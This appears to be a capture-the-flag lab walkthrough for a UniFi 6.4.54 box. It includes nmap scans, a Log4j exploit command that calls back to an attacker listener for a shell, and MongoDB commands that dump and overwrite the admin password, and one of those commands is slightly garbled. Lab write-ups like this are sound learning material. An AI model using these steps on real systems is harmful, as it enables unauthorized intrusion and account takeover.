# Nmap

Lets start with a basic scan and see what we can find:
`sudo nmap -sV -sC 10.129.209.94 -oN nmap.basic`

![[Pasted image 20250526161318.png]]


==Deeper Nmap scan==
`sudo nmap -p- -sV -sC --script=default,vuln,exploit -T4 -oN nmap.full 10.129.209.94`

### Thoughts: 
1. We have three interesting open ports (6789, 8080, and 8443) Let's look into those starting with ==tomcat==

#### Google search on `ssl/nagios-ncsa` and `ibm-db2-admin`


## Going to the tomcat server shows this login screen: 
![[Pasted image 20250526161828.png]]

==Unifi 6.4.54?== What is that?

## There is an exploit for this version of unifi:
https://github.com/puzzlepeaches/Log4jUnifi
^^ It actually worked!

-> Compile payload with maven: `mvn package -f utils/rogue-jndi`
-> Run the exploit (don't forget your listener!): `python3 exploit.py -u https://10.129.209.94:8443 -i 10.10.16.85 -p 4444`
![[Pasted image 20250526180252.png]]


==User.txt==: 6ced1a6a89e666c0620cdb10262ba127

## Getting root:
1. uploaded linpeas and ran it
2. Kernel: `Linux unified 5.4.0-77-generic #86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux`


### Found a mongo database, how do we interact with that?
![[Pasted image 20250526182905.png]]


## Print users on the mongodb
-> I tried going into the command line and it did not work
It seems you have to execute them outside of the MongoDB

`mongo --port 27117 ace --eval 'db.admin.find().forEach(printjson);'`

#### Reset the admin password:
`mongo --port 27117 ace --eval 'db.admin.update({'_id':ObjectId('61ce278f46e0fb0012d47ee4')},{$set:{'x_shadow':'Password1234'}})’ <b0012d47ee4')},{$set:{'x_shadow':Password1234'}})'`

==Now we can login to ssh and get the root flag==



